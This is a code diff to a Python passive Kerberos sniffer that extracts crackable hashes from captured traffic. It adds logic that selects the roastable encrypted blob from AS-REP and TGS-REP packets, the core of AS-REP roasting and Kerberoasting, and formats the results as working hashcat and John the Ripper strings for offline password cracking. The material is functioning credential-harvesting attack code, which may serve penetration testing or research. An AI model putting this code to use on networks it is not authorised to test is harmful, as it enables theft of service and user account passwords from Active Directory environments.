@@ -67,15 +67,55 @@ class KerberosHash:
 
     @property
     def hashcat_format(self) -> str:
-        """Hashcat-compatible hash string."""
-        if self.hash_type == "AS-REQ" and self.etype == 23:
-            return f"$krb5pa$23${self.username}${self.domain}${self.hash_value}"
-        elif self.hash_type == "AS-REP":
-            return f"$krb5asrep${self.etype}${self.username}@{self.domain}:{self.hash_value}"
-        elif self.hash_type == "TGS-REP":
-            return f"$krb5tgs${self.etype}$*{self.username}${self.domain}${self.service_name}*${self.hash_value}"
-        # Unrecognized type / unsupported etype: no valid $krb5 hashcat line, so
-        # return "" rather than a bare value that looks like a deliverable hash.
+        """Hashcat/John-compatible hash string.
+
+        A Kerberos enc-part is ``edata + HMAC-checksum``; the cracking formats
+        need the checksum as its own field, and its size/position depend on the
+        cipher family:
+          - RC4  (etype 23):    checksum = FIRST 16 bytes (32 hex), edata = rest
+          - AES  (etype 17/18): checksum = LAST  12 bytes (24 hex), edata = rest
+
+        Verified against hashcat example_hashes (modes 7500/18200/13100/19600/
+        19700/19800/19900) and John's krb5asrep format for the AES AS-REP case
+        (hashcat has no AES AS-REP mode). Returns "" for anything we cannot emit
+        a valid, crackable line for.
+        """
+        c = self.hash_value
+        if not c:
+            return ""
+
+        if self.hash_type == "AS-REQ":
+            # 7500 (RC4) carries an explicit salt field (REALM+user); the AES
+            # pre-auth modes 19800/19900 do NOT.
+            if self.etype == 23:
+                salt = f"{self.domain}{self.username}"
+                return f"$krb5pa$23${self.username}${self.domain}${salt}${c}"
+            if self.etype in (17, 18):
+                return f"$krb5pa${self.etype}${self.username}${self.domain}${c}"
+            return ""
+
+        if self.hash_type == "AS-REP":
+            if self.etype == 23 and len(c) > 32:  # hashcat 18200
+                checksum, edata = c[:32], c[32:]
+                return f"$krb5asrep$23${self.username}@{self.domain}:{checksum}${edata}"
+            if self.etype in (17, 18) and len(c) > 24:  # John krb5asrep (no hashcat mode)
+                edata, checksum = c[:-24], c[-24:]
+                salt = f"{self.domain}{self.username}"
+                return f"$krb5asrep${self.etype}${salt}${edata}${checksum}"
+            return ""
+
+        if self.hash_type == "TGS-REP":
+            if self.etype == 23 and len(c) > 32:  # hashcat 13100
+                checksum, edata = c[:32], c[32:]
+                return (
+                    f"$krb5tgs$23$*{self.username}${self.domain}${self.service_name}*"
+                    f"${checksum}${edata}"
+                )
+            if self.etype in (17, 18) and len(c) > 24:  # hashcat 19600/19700 (no *spn* wrapper)
+                edata, checksum = c[:-24], c[-24:]
+                return f"$krb5tgs${self.etype}${self.username}${self.domain}${checksum}${edata}"
+            return ""
+
         return ""
 
 
@@ -248,6 +288,31 @@ class KerberosPassiveListener(PySharkListenerBase):
             return 0
         return len([p for p in s.split(",") if p.strip()])
 
+    def _cipher_occurrences(self, layer, name: str = "cipher") -> List[str]:
+        """Return each occurrence of a Kerberos cipher field as clean hex.
+
+        A Kerberos reply carries multiple ``kerberos.cipher`` values (the
+        ticket enc-part and the KDC-REP/authenticator enc-part). They must stay
+        SEPARATE -- never comma-joined -- so callers can select the single blob
+        that is actually crackable. Each is returned as lowercase hex with no
+        ``:``/``,`` separators.
+        """
+        raw = getattr(layer, name, None)
+        raw = self._resolve_value(raw, None)
+        if raw is None:
+            return []
+        items = raw if isinstance(raw, (list, tuple)) else [raw]
+        out: List[str] = []
+        for v in items:
+            v = self._resolve_value(v, "")
+            if isinstance(v, bytes):
+                h = v.hex()
+            else:
+                h = str(v).replace(":", "").replace(",", "").strip()
+            if h:
+                out.append(h)
+        return out
+
     @staticmethod
     def _parse_principal(raw: str) -> str:
         """Parse principal from CNameString/SNameString.
@@ -369,9 +434,7 @@ class KerberosPassiveListener(PySharkListenerBase):
         # field. Count its components and bucket by request vs reply msg type.
         pa_data_count = self._count_field_components(krb_layer, "padata_type")
         # Combined packets (e.g. AS-REQ+AP-REQ "10,14") count as requests.
-        msg_types_present = {
-            int(p) for p in msg_type_str.split(",") if p.strip().isdigit()
-        }
+        msg_types_present = {int(p) for p in msg_type_str.split(",") if p.strip().isdigit()}
         is_request = bool(msg_types_present & {KRB_AS_REQ, KRB_TGS_REQ})
         pa_req_count = pa_data_count if (pa_data_count and is_request) else ""
         pa_rep_count = pa_data_count if (pa_data_count and not is_request) else ""
@@ -733,17 +796,16 @@ class KerberosPassiveListener(PySharkListenerBase):
 
         realm = _f(krb_layer, "realm").split(",")[0]
 
-        # AS-REP cipher: try encryptedKDCREPData_cipher first (KDC reply encryption),
-        # then encryptedTicketData_cipher (ticket encryption), then generic cipher.
-        cipher = (
-            _f(krb_layer, "encryptedKDCREPData_cipher")
-            or _f(krb_layer, "encryptedTicketData_cipher")
-            or _f(krb_layer, "cipher")
-        )
-        if not cipher:
+        # AS-REP roasting target = the KDC-REP enc-part, encrypted with the
+        # CLIENT's key (crackable). The reply also carries the ticket enc-part
+        # (krbtgt key, NOT crackable). In KDC-REP the ticket [5] is encoded
+        # before enc-part [6], so tshark lists them as [ticket, kdc-rep] and
+        # the roastable blob is the LAST kerberos.cipher occurrence.
+        ciphers = self._cipher_occurrences(krb_layer)
+        if not ciphers:
             return
 
-        hash_value = cipher.replace(":", "")
+        hash_value = ciphers[-1]
 
         if self._is_duplicate_hash("AS-REP", username, realm, hash_value):
             return
@@ -780,13 +842,15 @@ class KerberosPassiveListener(PySharkListenerBase):
         realm = _f(krb_layer, "realm").split(",")[0]
         service_name = self._parse_service_name(_f(krb_layer, "SNameString"))
 
-        # TGS-REP cipher: try encryptedTicketData_cipher first (ticket encryption),
-        # then generic cipher.
-        cipher = _f(krb_layer, "encryptedTicketData_cipher") or _f(krb_layer, "cipher")
-        if not cipher:
+        # Kerberoasting target = the service ticket enc-part, encrypted with the
+        # SERVICE account key (crackable). In KDC-REP the ticket [5] is encoded
+        # before the KDC-REP enc-part [6], so the ticket blob is the FIRST
+        # kerberos.cipher occurrence.
+        ciphers = self._cipher_occurrences(krb_layer)
+        if not ciphers:
             return
 
-        hash_value = cipher.replace(":", "")
+        hash_value = ciphers[0]
 
         if self._is_duplicate_hash("TGS-REP", username, realm, hash_value):
             return
